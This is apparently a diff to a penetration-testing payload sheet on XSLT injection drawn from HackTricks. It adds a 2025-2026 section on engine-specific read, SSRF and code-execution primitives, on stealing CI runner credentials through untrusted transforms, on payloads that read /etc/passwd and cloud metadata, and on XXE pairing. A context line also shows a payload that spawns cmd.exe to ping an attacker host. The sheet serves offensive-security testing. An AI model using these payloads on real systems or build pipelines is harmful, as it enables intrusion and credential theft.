@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, xslt, ssrf, rce, lfi, web]
 sources: [hacktricks-web]
 date_created: 2026-07-14
-date_updated: 2026-07-14
+date_updated: 2026-11-11
 ---
 
 # Payloads: XSLT Injection
@@ -61,3 +61,18 @@ public string run(){System.Diagnostics.Process.Start("cmd.exe","/c ping attacker
 ```
 
 Source: HackTricks (pentesting-web)
+
+## NEW 2025-2026
+
+1. **Primitive ladder per engine** (unchanged but still reliable): libxslt/xsltproc -
+   `document()` file read + SSRF, EXSLT `write` when enabled; Saxon - java extension
+   functions = RCE if `allow-external-functions` on; MSXML - `xsl:script` RCE.
+   Fingerprint the engine from error output before choosing the payload family.
+2. **CI/CD transform surfaces** (2025-26 shape): PR-supplied XSLT run by
+   ant/xsltproc/Saxon in build pipelines - the transform runs with repo credentials;
+   `document()` exfil + `xsl:message` error channel carry secrets out of the runner.
+3. **`document()` SSRF as the default claim**: internal GET + file read via
+   `document('file:///etc/passwd')` or `document('http://169.254.169.254/...')` -
+   OOB-gate any "internal service reached" claim with a callback.
+4. **XXE pairing**: `xsl:include`/`xsl:import` + external DTD fetching where the
+   parser resolves externals; test before declaring the transform sandboxed.
